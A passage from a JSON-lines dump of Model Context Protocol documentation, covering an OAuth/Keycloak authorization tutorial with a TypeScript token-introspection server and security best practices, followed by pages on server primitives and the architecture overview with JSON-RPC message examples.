these.\n\n<Tabs>\n<Tab title='TypeScript'>\n\nYou can see the complete TypeScript project in the [sample repository](https://github.com/localden/min-ts-mcp-auth).\n\nPrior to running the code below, ensure that you have a `.env` file with the following content:\n\n```env\n# Server host/port\nHOST=localhost\nPORT=3000\n\n# Auth server location\nAUTH_HOST=localhost\nAUTH_PORT=8080\nAUTH_REALM=master\n\n# Keycloak OAuth client credentials\nOAUTH_CLIENT_ID=<YOUR_SERVER_CLIENT_ID>\nOAUTH_CLIENT_SECRET=<YOUR_SERVER_CLIENT_SECRET>\n```\n\n`OAUTH_CLIENT_ID` and `OAUTH_CLIENT_SECRET` are associated with the MCP server client we created earlier.\n\nIn addition to implementing the MCP authorization specification, the server below also does token introspection via Keycloak to make sure that the token it receives from the client is valid. It also implements basic logging to allow you to easily diagnose any issues.\n\n```typescript\nimport \"dotenv/config\";\nimport express from \"express\";\nimport { randomUUID } from \"node:crypto\";\nimport { McpServer } from \"@modelcontextprotocol/sdk/server/mcp.js\";\nimport { StreamableHTTPServerTransport } from \"@modelcontextprotocol/sdk/server/streamableHttp.js\";\nimport { isInitializeRequest } from \"@modelcontextprotocol/sdk/types.js\";\nimport { z } from \"zod\";\nimport cors from \"cors\";\nimport {\n  mcpAuthMetadataRouter,\n  getOAuthProtectedResourceMetadataUrl,\n} from \"@modelcontextprotocol/sdk/server/auth/router.js\";\nimport { requireBearerAuth } from \"@modelcontextprotocol/sdk/server/auth/middleware/bearerAuth.js\";\nimport { OAuthMetadata } from \"@modelcontextprotocol/sdk/shared/auth.js\";\nimport { checkResourceAllowed } from \"@modelcontextprotocol/sdk/shared/auth-utils.js\";\nconst CONFIG = {\n  host: process.env.HOST || \"localhost\",\n  port: Number(process.env.PORT) || 3000,\n  auth: {\n    host: process.env.AUTH_HOST || process.env.HOST || \"localhost\",\n    port: Number(process.env.AUTH_PORT) || 8080,\n    realm: process.env.AUTH_REALM || \"master\",\n    clientId: process.env.OAUTH_CLIENT_ID || \"mcp-server\",\n    clientSecret: process.env.OAUTH_CLIENT_SECRET || \"\",\n  },\n};\n\nfunction createOAuthUrls() {\n  const authBaseUrl = new URL(\n    `http://${CONFIG.auth.host}:${CONFIG.auth.port}/realms/${CONFIG.auth.realm}/`,\n  );\n  return {\n    issuer: authBaseUrl.toString(),\n    introspection_endpoint: new URL(\n      \"protocol/openid-connect/token/introspect\",\n      authBaseUrl,\n    ).toString(),\n    authorization_endpoint: new URL(\n      \"protocol/openid-connect/auth\",\n      authBaseUrl,\n    ).toString(),\n    token_endpoint: new URL(\n      \"protocol/openid-connect/token\",\n      authBaseUrl,\n    ).toString(),\n  };\n}\n\nfunction createRequestLogger() {\n  return (req: any, res: any, next: any) => {\n    const start = Date.now();\n    res.on(\"finish\", () => {\n      const ms = Date.now() - start;\n      console.log(\n        `${req.method} ${req.originalUrl} -> ${res.statusCode} ${ms}ms`,\n      );\n    });\n    next();\n  };\n}\n\nconst app = express();\n\napp.use(\n  express.json({\n    verify: (req: any, _res, buf) => {\n      req.rawBody = buf?.toString() ?? \"\";\n    },\n  }),\n);\n\napp.use(\n  cors({\n    origin: \"*\",\n    exposedHeaders: [\"Mcp-Session-Id\"],\n  }),\n);\n\napp.use(createRequestLogger());\n\nconst mcpServerUrl = new URL(`http://${CONFIG.host}:${CONFIG.port}`);\nconst oauthUrls = createOAuthUrls();\n\nconst oauthMetadata: OAuthMetadata = {\n  ...oauthUrls,\n  response_types_supported: [\"code\"],\n};\n\nconst tokenVerifier = {\n  verifyAccessToken: async (token: string) => {\n    const endpoint = oauthMetadata.introspection_endpoint;\n\n    if (!endpoint) {\n      console.error(\"[auth] no introspection endpoint in metadata\");\n      throw new Error(\"No token verification endpoint available in metadata\");\n    }\n\n    const params = new URLSearchParams({\n      token: token,\n      client_id: CONFIG.auth.clientId,\n    });\n\n    if (CONFIG.auth.clientSecret) {\n      params.set(\"client_secret\", CONFIG.auth.clientSecret);\n    }\n\n    let response: Response;\n    try {\n      response = await fetch(endpoint, {\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/x-www-form-urlencoded\",\n        },\n        body: params.toString(),\n      });\n    } catch (e) {\n      console.error(\"[auth] introspection fetch threw\", e);\n      throw e;\n    }\n\n    if (!response.ok) {\n      const txt = await response.text();\n      console.error(\"[auth] introspection non-OK\", { status: response.status });\n\n      try {\n        const obj = JSON.parse(txt);\n        console.log(JSON.stringify(obj, null, 2));\n      } catch {\n        console.error(txt);\n      }\n      throw new Error(`Invalid or expired token: ${txt}`);\n    }\n\n    let data: any;\n    try {\n      data = await response.json();\n    } catch (e) {\n      const txt = await response.text();\n      console.error(\"[auth] failed to parse introspection JSON\", {\n        error: String(e),\n        body: txt,\n      });\n      throw e;\n    }\n\n    if (data.active === false) {\n      throw new Error(\"Inactive token\");\n    }\n\n    if (!data.aud) {\n      throw new Error(\"Resource indicator (aud) missing\");\n    }\n\n    const audiences: string[] = Array.isArray(data.aud) ? data.aud : [data.aud];\n    const allowed = audiences.some((a) =>\n      checkResourceAllowed({\n        requestedResource: a,\n        configuredResource: mcpServerUrl,\n      }),\n    );\n    if (!allowed) {\n      throw new Error(\n        `None of the provided audiences are allowed.

A few key issues are called out below.\n\n- **Do not implement token validation or authorization logic by yourself**. Use off-the-shelf, well-tested, and secure libraries for things like token validation or authorization decisions. Doing everything from scratch means that you're more likely to implement things incorrectly unless you are a security expert.\n- **Use short-lived access tokens**. Depending on the authorization server used, this setting might be customizable. We recommend to not use long-lived tokens - if a malicious actor steals them, they will be able to maintain their access for longer periods.\n- **Always validate tokens**. Just because your server received a token does not mean that the token is valid or that it's meant for your server. Always verify that what your MCP server is getting from the client matches the required constraints.\n- **Store tokens in secure, encrypted storage**. In certain scenarios, you might need to cache tokens server-side. If that is the case, ensure that the storage has the right access controls and cannot be easily exfiltrated by malicious parties with access to your server. You should also implement robust cache eviction policies to ensure that your MCP server is not re-using expired or otherwise invalid tokens.\n- **Enforce HTTPS in production**. Do not accept tokens or redirect callbacks over plain HTTP except for `localhost` during development.\n- **Least-privilege scopes**. Don't use catch‑all scopes. Split access per tool or capability where possible and verify required scopes per route/tool on the resource server.\n- **Don't log credentials**. Never log `Authorization` headers, tokens, codes, or secrets. Scrub query strings and headers. Redact sensitive fields in structured logs.\n- **Separate app vs. resource server credentials**. Don't reuse your MCP server's client secret for end‑user flows. Store all secrets in a proper secret manager, not in source control.\n- **Return proper challenges**. On 401, include `WWW-Authenticate` with `Bearer`, `realm`, and `resource_metadata` so clients can discover how to authenticate.\n- **DCR (Dynamic Client Registration) controls**. If enabled, be aware of constraints specific to your organization, such as trusted hosts, required vetting, and audited registrations. Unauthenticated DCR means that anyone can register any client with your authorization server.\n- **Multi‑tenant/realm mix-ups**. Pin to a single issuer/tenant unless explicitly multi‑tenant. Reject tokens from other realms even if signed by the same authorization server.\n- **Audience/resource indicator misuse**. Don't configure or accept generic audiences (like `api`) or unrelated resources. Require the audience/resource to match your configured server.\n- **Error detail leakage**. Return generic messages to clients, but log detailed reasons with correlation IDs internally to aid troubleshooting without exposing internals.\n- **Session identifier hardening**. Treat `Mcp-Session-Id` as untrusted input; never tie authorization to it. Regenerate on auth changes and validate lifecycle server‑side.\n\n## Related Standards and Documentation\n\nMCP authorization builds on these well-established standards:\n\n- **[OAuth 2.1](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13)**: The core authorization framework\n- **[RFC 8414](https://datatracker.ietf.org/doc/html/rfc8414)**: Authorization Server Metadata discovery\n- **[RFC 7591](https://datatracker.ietf.org/doc/html/rfc7591)**: Dynamic Client Registration\n- **[RFC 9728](https://datatracker.ietf.org/doc/html/rfc9728)**: Protected Resource Metadata\n- **[RFC 8707](https://datatracker.ietf.org/doc/html/rfc8707)**: Resource Indicators\n\nFor additional details, refer to:\n\n- [Authorization Specification](/specification/draft/basic/authorization)\n- [Security Best Practices](/specification/draft/basic/security_best_practices)\n- [Available MCP SDKs](/docs/sdk)\n\nUnderstanding these standards will help you implement authorization correctly and troubleshoot issues when they arise.\n"}

Tools can write to databases, call external APIs, modify files, or trigger other logic. | Search flights<br />Send messages<br />Create calendar events      | Model           |\n| **Resources** | Passive data sources that provide read-only access to information for context, such as file contents, database schemas, or API documentation.                                           | Retrieve documents<br />Access knowledge bases<br />Read calendars | Application     |\n| **Prompts**   | Pre-built instruction templates that tell the model to work with specific tools and resources.                                                                                          | Plan a vacation<br />Summarize my meetings<br />Draft an email     | User            |\n\nWe will use a hypothetical scenario to demonstrate the role of each of these features, and show how they can work together.\n\n### Tools\n\nTools enable AI models to perform actions. Each tool defines a specific operation with typed inputs and outputs. The model requests tool execution based on context.\n\n#### How Tools Work\n\nTools are schema-defined interfaces that LLMs can invoke. MCP uses JSON Schema for validation. Each tool performs a single operation with clearly defined inputs and outputs. Tools may require user consent prior to execution, helping to ensure users maintain control over actions taken by a model.\n\n**Protocol operations:**\n\n| Method       | Purpose                  | Returns                                |\n| ------------ | ------------------------ | -------------------------------------- |\n| `tools/list` | Discover available tools | Array of tool definitions with schemas |\n| `tools/call` | Execute a specific tool  | Tool execution result                  |\n\n**Example tool definition:**\n\n```typescript\n{\n  name: \"searchFlights\",\n  description: \"Search for available flights\",\n  inputSchema: {\n    type: \"object\",\n    properties: {\n      origin: { type: \"string\", description: \"Departure city\" },\n      destination: { type: \"string\", description: \"Arrival city\" },\n      date: { type: \"string\", format: \"date\", description: \"Travel date\" }\n    },\n    required: [\"origin\", \"destination\", \"date\"]\n  }\n}\n```\n\n#### Example: Travel Booking\n\nTools enable AI applications to perform actions on behalf of users. In a travel planning scenario, the AI application might use several tools to help book a vacation:\n\n**Flight Search**\n\n```\nsearchFlights(origin: \"NYC\", destination: \"Barcelona\", date: \"2024-06-15\")\n```\n\nQueries multiple airlines and returns structured flight options.\n\n**Calendar Blocking**\n\n```\ncreateCalendarEvent(title: \"Barcelona Trip\", startDate: \"2024-06-15\", endDate: \"2024-06-22\")\n```\n\nMarks the travel dates in the user's calendar.\n\n**Email notification**\n\n```\nsendEmail(to: \"team@work.com\", subject: \"Out of Office\", body: \"...\")\n```\n\nSends an automated out-of-office message to colleagues.\n\n#### User Interaction Model\n\nTools are model-controlled, meaning AI models can discover and invoke them automatically. However, MCP emphasizes human oversight through several mechanisms.\n\nFor trust and safety, applications can implement user control through various mechanisms, such as:\n\n- Displaying available tools in the UI, enabling users to define whether a tool should be made available in specific interactions\n- Approval dialogs for individual tool executions\n- Permission settings for pre-approving certain safe operations\n- Activity logs that show all tool executions with their results\n\n### Resources\n\nResources provide structured access to information that the AI application can retrieve and provide to models as context.\n\n#### How Resources Work\n\nResources expose data from files, APIs, databases, or any other source that an AI needs to understand context. Applications can access this information directly and decide how to use it - whether that's selecting relevant portions, searching with embeddings, or passing it all to the model.\n\nEach resource has a unique URI (e.g., `file:///path/to/document.md`) and declares its MIME type for appropriate content handling.\n\nResources support two discovery patterns:\n\n- **Direct Resources** - fixed URIs that point to specific data. Example: `calendar://events/2024` - returns calendar availability for 2024\n- **Resource Templates** - dynamic URIs with parameters for flexible queries. Example:\n  - `travel://activities/{city}/{category}` - returns activities by city and category\n  - `travel://activities/barcelona/museums` - returns all museums in Barcelona\n\nResource Templates include metadata such as title, description, and expected MIME type, making them discoverable and self-documenting.\n\n**Protocol operations:**\n\n| Method                     | Purpose                         | Returns                                |\n| -------------------------- | ------------------------------- | -------------------------------------- |\n| `resources/list`           | List available direct resources | Array of resource descriptors          |\n| `resources/templates/list` | Discover resource templates     | Array of resource template definitions |\n| `resources/read`           | Retrieve resource contents      | Resource data with metadata            |\n| `resources/subscribe`      | Monitor resource changes        | Subscription confirmation              |\n\n#### Example: Getting Travel Planning Context\n\nContinuing with the travel planning example, resources provide the AI application with access to relevant information:\n\n- **Calendar data** (`calendar://events/2024`) - Checks user availability\n- **Travel documents** (`file:///Documents/Travel/passport.pdf`) - Accesses important documents\n- **Previous itineraries** (`trips://history/barcelona-2023`) - References past trips and preferences\n\nThe AI application retrieves these resources and decides how to process them, whether selecting a subset of data using embeddings or keyword search, or passing raw data directly to the model.\n\nIn this case, it provides calendar data, weather information, and travel preferences to the model, enabling it to check availability, look up weather patterns, and reference past travel preferences.\n\n**Resource Template Examples:**\n\n```json\n{\n  \"uriTemplate\": \"weather://forecast/{city}/{date}\",\n  \"name\": \"weather-forecast\",\n  \"title\": \"Weather Forecast\",\n  \"description\": \"Get weather forecast for any city and date\",\n  \"mimeType\": \"application/json\"\n}\n\n{\n  \"uriTemplate\": \"travel://flights/{origin}/{destination}\",\n  \"name\": \"flight-search\",\n  \"title\": \"Flight Search\",\n  \"description\": \"Search available flights between cities\",\n  \"mimeType\": \"application/json\"\n}\n```\n\nThese templates enable flexible queries. For weather data, users can access forecasts for any city/date combination. For flights, they can search routes between any two airports. When a user has input \"NYC\" as the `origin` airport and begins to input \"Bar\" as the `destination` airport, the system can suggest \"Barcelona (BCN)\" or \"Barbados (BGI)\".\n\n#### Parameter Completion\n\nDynamic resources support parameter completion. For example:\n\n- Typing \"Par\" as input for `weather://forecast/{city}` might suggest \"Paris\" or \"Park City\"\n- Typing \"JFK\" for `flights://search/{airport}` might suggest \"JFK - John F. Kennedy International\"\n\nThe system helps discover valid values without requiring exact format knowledge.\n\n#### User Interaction Model\n\nResources are application-driven, giving them flexibility in how they retrieve, process, and present available context. Common interaction patterns include:\n\n- Tree or list views for browsing resources in familiar folder-like structures\n- Search and filter interfaces for finding specific resources\n- Automatic context inclusion or smart suggestions based on heuristics or AI selection\n- Manual or bulk selection interfaces for including single or multiple resources\n\nApplications are free to implement resource discovery through any interface pattern that suits their needs. The protocol doesn't mandate specific UI patterns, allowing for resource pickers with preview capabilities, smart suggestions based on current conversation context, bulk selection for including multiple resources, or integration with existing file browsers and data explorers.\n\n### Prompts\n\nPrompts provide reusable templates. They allow MCP server authors to provide parameterized prompts for a domain, or showcase how to best use the MCP server.\n\n#### How Prompts Work\n\nPrompts are structured templates that define expected inputs and interaction patterns. They are user-controlled, requiring explicit invocation rather than automatic triggering. Prompts can be context-aware, referencing available resources and tools to create comprehensive workflows. Similar to resources, prompts support parameter completion to help users discover valid argument values.\n\n**Protocol operations:**\n\n| Method         | Purpose                    | Returns                               |\n| -------------- | -------------------------- | ------------------------------------- |\n| `prompts/list` | Discover available prompts | Array of prompt descriptors           |\n| `prompts/get`  | Retrieve prompt details    | Full prompt definition with arguments |\n\n#### Example: Streamlined Workflows\n\nPrompts provide structured templates for common tasks. In the travel planning context:\n\n**\"Plan a vacation\" prompt:**\n\n```json\n{\n  \"name\": \"plan-vacation\",\n  \"title\": \"Plan a vacation\",\n  \"description\": \"Guide through vacation planning process\",\n  \"arguments\": [\n    { \"name\": \"destination\", \"type\": \"string\", \"required\": true },\n    { \"name\": \"duration\", \"type\": \"number\", \"description\": \"days\" },\n    { \"name\": \"budget\", \"type\": \"number\", \"required\": false },\n    { \"name\": \"interests\", \"type\": \"array\", \"items\": { \"type\": \"string\" } }\n  ]\n}\n```\n\nRather than unstructured natural language input, the prompt system enables:\n\n1. Selection of the \"Plan a vacation\" template\n2. Structured input: Barcelona, 7 days, $3000, [\"beaches\", \"architecture\", \"food\"]\n3. Consistent workflow execution based on the template\n\n#### User Interaction Model\n\nPrompts are user-controlled, requiring explicit invocation. The protocol gives implementers freedom to design interfaces that feel natural within their application. Key principles include:\n\n- Easy discovery of available prompts\n- Clear descriptions of what each prompt does\n- Natural argument input with validation\n- Transparent display of the prompt's underlying template\n\nApplications typically expose prompts through various UI patterns such as:\n\n- Slash commands (typing \"/\" to see available prompts like /plan-vacation)\n- Command palettes for searchable access\n- Dedicated UI buttons for frequently used prompts\n- Context menus that suggest relevant prompts\n\n## Bringing Servers Together\n\nThe real power of MCP emerges when multiple servers work together, combining their specialized capabilities through a unified interface.\n\n### Example: Multi-Server Travel Planning\n\nConsider a personalized AI travel planner application, with three connected servers:\n\n- **Travel Server** - Handles flights, hotels, and itineraries\n- **Weather Server** - Provides climate data and forecasts\n- **Calendar/Email Server** - Manages schedules and communications\n\n#### The Complete Flow\n\n1. **User invokes a prompt with parameters:**\n\n   ```json\n   {\n     \"prompt\": \"plan-vacation\",\n     \"arguments\": {\n       \"destination\": \"Barcelona\",\n       \"departure_date\": \"2024-06-15\",\n       \"return_date\": \"2024-06-22\",\n       \"budget\": 3000,\n       \"travelers\": 2\n     }\n   }\n   ```\n\n2. **User selects resources to include:**\n   - `calendar://my-calendar/June-2024` (from Calendar Server)\n   - `travel://preferences/europe` (from Travel Server)\n   - `travel://past-trips/Spain-2023` (from Travel Server)\n\n3. **AI processes the request using tools:**\n\n   The AI first reads all selected resources to gather context - identifying available dates from the calendar, learning preferred airlines and hotel types from travel preferences, and discovering previously enjoyed locations from past trips.\n\n   Using this context, the AI then executes a series of Tools:\n   - `searchFlights()` - Queries airlines for NYC to Barcelona flights\n   - `checkWeather()` - Retrieves climate forecasts for travel dates\n\n   The AI then uses this information to create the booking and following steps, requesting approval from the user where necessary:\n   - `bookHotel()` - Finds hotels within the specified budget\n   - `createCalendarEvent()` - Adds the trip to the user's calendar\n   - `sendEmail()` - Sends confirmation with trip details\n\n**The result:** Through multiple MCP servers, the user researched and booked a Barcelona trip tailored to their schedule. The \"Plan a Vacation\" prompt guided the AI to combine Resources (calendar availability and travel history) with Tools (searching flights, booking hotels, updating calendars) across different servers—gathering context and executing the booking. A task that could've taken hours was completed in minutes using MCP.\n"}
{"source":"github","repo":"mcp-spec","path":"docs/docs/learn/architecture.mdx","content":"---\ntitle: Architecture overview\nsidebarTitle: Architecture\ntype: docs\n---\n\nThis overview of the Model Context Protocol (MCP) discusses its [scope](#scope) and [core concepts](#concepts-of-mcp), and provides an [example](#example) demonstrating each core concept.\n\nBecause MCP SDKs abstract away many concerns, most developers will likely find the [data layer protocol](#data-layer-protocol) section to be the most useful. It discusses how MCP servers can provide context to an AI application.\n\nFor specific implementation details, please refer to the documentation for your [language-specific SDK](/docs/sdk).\n\n## Scope\n\nThe Model Context Protocol includes the following projects:\n\n- [MCP Specification](https://modelcontextprotocol.io/specification/latest): A specification of MCP that outlines the implementation requirements for clients and servers.\n- [MCP SDKs](/docs/sdk): SDKs for different programming languages that implement MCP.\n- **MCP Development Tools**: Tools for developing MCP servers and clients, including the [MCP Inspector](https://github.com/modelcontextprotocol/inspector)\n- [MCP Reference Server Implementations](https://github.com/modelcontextprotocol/servers): Reference implementations of MCP servers.\n\n<Note>\n  MCP focuses solely on the protocol for context exchange—it does not dictate\n  how AI applications use LLMs or manage the provided context.\n</Note>\n\n## Concepts of MCP\n\n### Participants\n\nMCP follows a client-server architecture where an MCP host — an AI application like [Claude Code](https://www.anthropic.com/claude-code) or [Claude Desktop](https://www.claude.ai/download) — establishes connections to one or more MCP servers. The MCP host accomplishes this by creating one MCP client for each MCP server. Each MCP client maintains a dedicated one-to-one connection with its corresponding MCP server.\n\nThe key participants in the MCP architecture are:\n\n- **MCP Host**: The AI application that coordinates and manages one or multiple MCP clients\n- **MCP Client**: A component that maintains a connection to an MCP server and obtains context from an MCP server for the MCP host to use\n- **MCP Server**: A program that provides context to MCP clients\n\n**For example**: Visual Studio Code acts as an MCP host. When Visual Studio Code establishes a connection to an MCP server, such as the [Sentry MCP server](https://docs.sentry.io/product/sentry-mcp/), the Visual Studio Code runtime instantiates an MCP client object that maintains the connection to the Sentry MCP server.\nWhen Visual Studio Code subsequently connects to another MCP server, such as the [local filesystem server](https://github.com/modelcontextprotocol/servers/tree/main/src/filesystem), the Visual Studio Code runtime instantiates an additional MCP client object to maintain this connection, hence maintaining a one-to-one\nrelationship of MCP clients to MCP servers.\n\n```mermaid\ngraph TB\n    subgraph \"MCP Host (AI Application)\"\n        Client1[\"MCP Client 1\"]\n        Client2[\"MCP Client 2\"]\n        Client3[\"MCP Client 3\"]\n    end\n\n    Server1[\"MCP Server 1<br/>(e.g., Sentry)\"]\n    Server2[\"MCP Server 2<br/>(e.g., Filesystem)\"]\n    Server3[\"MCP Server 3<br/>(e.g., Database)\"]\n\n    Client1 ---|\"One-to-one<br/>connection\"| Server1\n    Client2 ---|\"One-to-one<br/>connection\"| Server2\n    Client3 ---|\"One-to-one<br/>connection\"| Server3\n```\n\nNote that **MCP server** refers to the program that serves context data, regardless of\nwhere it runs. MCP servers can execute locally or remotely. For example, when\nClaude Desktop launches the [filesystem\nserver](https://github.com/modelcontextprotocol/servers/tree/main/src/filesystem),\nthe server runs locally on the same machine because it uses the STDIO\ntransport. This is commonly referred to as a \"local\" MCP server. The official\n[Sentry MCP server](https://docs.sentry.io/product/sentry-mcp/) runs on the\nSentry platform, and uses the Streamable HTTP transport. This is commonly\nreferred to as a \"remote\" MCP server.\n\n### Layers\n\nMCP consists of two layers:\n\n- **Data layer**: Defines the JSON-RPC based protocol for client-server communication, including lifecycle management, and core primitives, such as tools, resources, prompts and notifications.\n- **Transport layer**: Defines the communication mechanisms and channels that enable data exchange between clients and servers, including transport-specific connection establishment, message framing, and authorization.\n\nConceptually the data layer is the inner layer, while the transport layer is the outer layer.\n\n#### Data layer\n\nThe data layer implements a [JSON-RPC 2.0](https://www.jsonrpc.org/) based exchange protocol that defines the message structure and semantics.\nThis layer includes:\n\n- **Lifecycle management**: Handles connection initialization, capability negotiation, and connection termination between clients and servers\n- **Server features**: Enables servers to provide core functionality including tools for AI actions, resources for context data, and prompts for interaction templates from and to the client\n- **Client features**: Enables servers to ask the client to sample from the host LLM, elicit input from the user, and log messages to the client\n- **Utility features**: Supports additional capabilities like notifications for real-time updates and progress tracking for long-running operations\n\n#### Transport layer\n\nThe transport layer manages communication channels and authentication between clients and servers. It handles connection establishment, message framing, and secure communication between MCP participants.\n\nMCP supports two transport mechanisms:\n\n- **Stdio transport**: Uses standard input/output streams for direct process communication between local processes on the same machine, providing optimal performance with no network overhead.\n- **Streamable HTTP transport**: Uses HTTP POST for client-to-server messages with optional Server-Sent Events for streaming capabilities. This transport enables remote server communication and supports standard HTTP authentication methods including bearer tokens, API keys, and custom headers. MCP recommends using OAuth to obtain authentication tokens.\n\nThe transport layer abstracts communication details from the protocol layer, enabling the same JSON-RPC 2.0 message format across all transport mechanisms.\n\n### Data Layer Protocol\n\nA core part of MCP is defining the schema and semantics between MCP clients and MCP servers. Developers will likely find the data layer — in particular, the set of [primitives](#primitives) — to be the most interesting part of MCP. It is the part of MCP that defines the ways developers can share context from MCP servers to MCP clients.\n\nMCP uses [JSON-RPC 2.0](https://www.jsonrpc.org/) as its underlying RPC protocol. Client and servers send requests to each other and respond accordingly. Notifications can be used when no response is required.\n\n#### Lifecycle management\n\nMCP is a <Tooltip tip=\"A subset of MCP can be made stateless using the Streamable HTTP transport\">stateful protocol</Tooltip> that requires lifecycle management. The purpose of lifecycle management is to negotiate the <Tooltip tip=\"Features and operations that a client or server supports, such as tools, resources, or prompts\">capabilities</Tooltip> that both client and server support. Detailed information can be found in the [specification](/specification/latest/basic/lifecycle), and the [example](#example) showcases the initialization sequence.\n\n#### Primitives\n\nMCP primitives are the most important concept within MCP. They define what clients and servers can offer each other. These primitives specify the types of contextual information that can be shared with AI applications and the range of actions that can be performed.\n\nMCP defines three core primitives that _servers_ can expose:\n\n- **Tools**: Executable functions that AI applications can invoke to perform actions (e.g., file operations, API calls, database queries)\n- **Resources**: Data sources that provide contextual information to AI applications (e.g., file contents, database records, API responses)\n- **Prompts**: Reusable templates that help structure interactions with language models (e.g., system prompts, few-shot examples)\n\nEach primitive type has associated methods for discovery (`*/list`), retrieval (`*/get`), and in some cases, execution (`tools/call`).\nMCP clients will use the `*/list` methods to discover available primitives. For example, a client can first list all available tools (`tools/list`) and then execute them. This design allows listings to be dynamic.\n\nAs a concrete example, consider an MCP server that provides context about a database. It can expose tools for querying the database, a resource that contains the schema of the database, and a prompt that includes few-shot examples for interacting with the tools.\n\nFor more details about server primitives see [server concepts](./server-concepts).\n\nMCP also defines primitives that _clients_ can expose. These primitives allow MCP server authors to build richer interactions.\n\n- **Sampling**: Allows servers to request language model completions from the client's AI application. This is useful when servers' authors want access to a language model, but want to stay model independent and not include a language model SDK in their MCP server. They can use the `sampling/complete` method to request a language model completion from the client's AI application.\n- **Elicitation**: Allows servers to request additional information from users. This is useful when servers' authors want to get more information from the user, or ask for confirmation of an action. They can use the `elicitation/request` method to request additional information from the user.\n- **Logging**: Enables servers to send log messages to clients for debugging and monitoring purposes.\n\nFor more details about client primitives see [client concepts](./client-concepts).\n\nBesides server and client primitives, the protocol offers cross-cutting utility primitives that augment how requests are executed:\n\n- **Tasks (Experimental)**: Durable execution wrappers that enable deferred result retrieval and status tracking for MCP requests (e.g., expensive computations, workflow automation, batch processing, multi-step operations)\n\n#### Notifications\n\nThe protocol supports real-time notifications to enable dynamic updates between servers and clients. For example, when a server's available tools change—such as when new functionality becomes available or existing tools are modified—the server can send tool update notifications to inform connected clients about these changes. Notifications are sent as JSON-RPC 2.0 notification messages (without expecting a response) and enable MCP servers to provide real-time updates to connected clients.\n\n## Example\n\n### Data Layer\n\nThis section provides a step-by-step walkthrough of an MCP client-server interaction, focusing on the data layer protocol. We'll demonstrate the lifecycle sequence, tool operations, and notifications using JSON-RPC 2.0 messages.\n\n<Steps>\n<Step title=\"Initialization (Lifecycle Management)\">\n\nMCP begins with lifecycle management through a capability negotiation handshake. As described in the [lifecycle management](#lifecycle-management) section, the client sends an `initialize` request to establish the connection and negotiate supported features.\n\n<CodeGroup>\n  ```json Initialize Request\n  {\n    \"jsonrpc\": \"2.0\",\n    \"id\": 1,\n    \"method\": \"initialize\",\n    \"params\": {\n      \"protocolVersion\": \"2025-06-18\",\n      \"capabilities\": {\n        \"elicitation\": {}\n      },\n      \"clientInfo\": {\n        \"name\": \"example-client\",\n        \"version\": \"1.0.0\"\n      }\n    }\n  }\n  ```\n  ```json Initialize Response\n  {\n    \"jsonrpc\": \"2.0\",\n    \"id\": 1,\n    \"result\": {\n      \"protocolVersion\": \"2025-06-18\",\n      \"capabilities\": {\n        \"tools\": {\n          \"listChanged\": true\n        },\n        \"resources\": {}\n      },\n      \"serverInfo\": {\n        \"name\": \"example-server\",\n        \"version\": \"1.0.0\"\n      }\n    }\n  }\n  ```\n</CodeGroup>\n\n#### Understanding the Initialization Exchange\n\nThe initialization process is a key part of MCP's lifecycle management and serves several critical purposes:\n\n1. **Protocol Version Negotiation**: The `protocolVersion` field (e.g., \"2025-06-18\") ensures both client and server are using compatible protocol versions. This prevents communication errors that could occur when different versions attempt to interact. If a mutually compatible version is not negotiated, the connection should be terminated.\n\n2. **Capability Discovery**: The `capabilities` object allows each party to declare what features they support, including which [primitives](#primitives) they can handle (tools, resources, prompts) and whether they support features like [notifications](#notifications). This enables efficient communication by avoiding unsupported operations.\n\n3. **Identity Exchange**: The `clientInfo` and `serverInfo` objects provide identification and versioning information for debugging and compatibility purposes.\n\nIn this example, the capability negotiation demonstrates how MCP primitives are declared:\n\n**Client Capabilities**:\n\n- `\"elicitation\": {}` - The client declares it can work with user interaction requests (can receive `elicitation/create` method calls)\n\n**Server Capabilities**:\n\n- `\"tools\": {\"listChanged\": true}` - The server supports the tools primitive AND can send `tools/list_changed` notifications when its tool list changes\n- `\"resources\": {}` - The server also supports the resources primitive (can handle `resources/list` and `resources/read` methods)\n\nAfter successful initialization, the client sends a notification to indicate it's ready:\n\n```json Notification\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"notifications/initialized\"\n}\n```\n\n#### How This Works in AI Applications\n\nDuring initialization, the AI application's MCP client manager establishes connections to configured servers and stores their capabilities for later use. The application uses this information to determine which servers can provide specific types of functionality (tools, resources, prompts) and whether they support real-time updates.\n\n```python Pseudo-code for AI application initialization\n# Pseudo Code\nasync with stdio_client(server_config) as (read, write):\n    async with ClientSession(read, write) as session:\n        init_response = await session.initialize()\n        if init_response.capabilities.tools:\n            app.register_mcp_server(session, supports_tools=True)\n        app.set_server_ready(session)\n```\n\n</Step>\n\n<Step title=\"Tool Discovery (Primitives)\">\nNow that the connection is established, the client can discover available tools by sending a `tools/list` request. This request is fundamental to MCP's tool discovery mechanism — it allows clients to understand what tools are available on the server before attempting to use them.\n\n<CodeGroup>\n  ```json Tools List Request\n  {\n    \"jsonrpc\": \"2.0\",\n    \"id\": 2,\n    \"method\": \"tools/list\"\n  }\n  ```\n  ```json Tools List Response\n  {\n    \"jsonrpc\": \"2.0\",\n    \"id\": 2,\n    \"result\": {\n      \"tools\": [\n        {\n          \"name\": \"calculator_arithmetic\",\n          \"title\": \"Calculator\",\n          \"description\": \"Perform mathematical calculations including basic arithmetic, trigonometric functions, and algebraic operations\",\n          \"inputSchema\": {\n            \"type\": \"object\",\n            \"properties\": {\n              \"expression\": {\n                \"type\": \"string\",\n                \"description\": \"Mathematical expression to evaluate (e.g., '2 + 3 * 4', 'sin(30)', 'sqrt(16)')\"\n              }\n            },\n            \"required\": [\"expression\"]\n          }\n        },\n        {\n          \"name\": \"weather_current\",\n          \"title\": \"Weather Information\",\n          \"description\": \"Get current weather information for any location worldwide\",\n          \"inputSchema\": {\n            \"type\": \"object\",\n            \"properties\": {\n              \"location\": {\n                \"type\": \"string\",\n                \"description\": \"City name, address, or coordinates (latitude,longitude)\"\n              },\n              \"units\": {\n                \"type\": \"string\",\n                \"enum\": [\"metric\", \"imperial\", \"kelvin\"],\n                \"description\": \"Temperature units to use in response\",\n                \"default\": \"metric\"\n              }\n            },\n            \"required\": [\"location\"]\n          }\n        }\n      ]\n    }\n  }\n  ```\n</CodeGroup>\n\n#### Understanding the Tool Discovery Request\n\nThe `tools/list` request is simple, containing no parameters.\n\n#### Understanding the Tool Discovery Response\n\nThe response contains a `tools` array that provides comprehensive metadata about each available tool. This array-based structure allows servers to expose multiple tools simultaneously while maintaining clear boundaries between different 